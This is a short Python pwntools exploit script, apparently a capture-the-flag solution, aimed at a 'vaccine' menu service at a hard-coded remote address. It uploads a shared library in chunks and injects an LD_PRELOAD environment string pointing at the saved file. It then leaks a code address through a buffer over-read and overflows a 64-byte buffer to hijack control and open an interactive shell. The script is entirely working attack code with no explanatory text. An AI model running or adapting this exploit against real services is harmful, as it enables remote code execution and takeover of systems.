#!/usr/bin/python
from pwn import *
 
def add_vacine(t, desc):
   s.sendline("1")
   s.recvuntil("> ")
   s.sendline("%d"%t)
   s.recvuntil("> ")
   s.send(desc)
   s.recv(4096)
 
def save():
   s.sendline("4")
 
def delete(idx):
   s.sendline("3")
   s.recv(4096)
   s.sendline("%d"%idx)
   s.recv(4096)
 
a = open("lib.so").read()
s = remote("15.165.98.42", 58763)
s.recv(4096)
s.send("fuck")
s.recv(4096)
 
for i in range(len(a)/1023 + 1):
   add_vacine(1, a[1023*i:1023*i+1023])
 
s.sendline("4")
s.recvuntil("saved at ")
filename = s.recvuntil("\n")[:-1]
s.close()
 
print filename
 
s = remote("15.165.98.42", 58763)
s.recv(4096)
s.send("LD_PRELOAD=%s\x00"%filename)
s.recv(4096)
 
add_vacine(1, "A"*1024)
 
s.sendline("2")
s.recvuntil("A"*1024)
code = s.recvn(6)+"\x00\x00"
code = u64(code)
s.recv(4096)
s.sendline("0")
s.sendline("0")
s.recv(4096)
print hex(code)
 
s.sendline("5")
s.recv(4096)
s.send("A"*64+p64(code))
 
s.interactive()
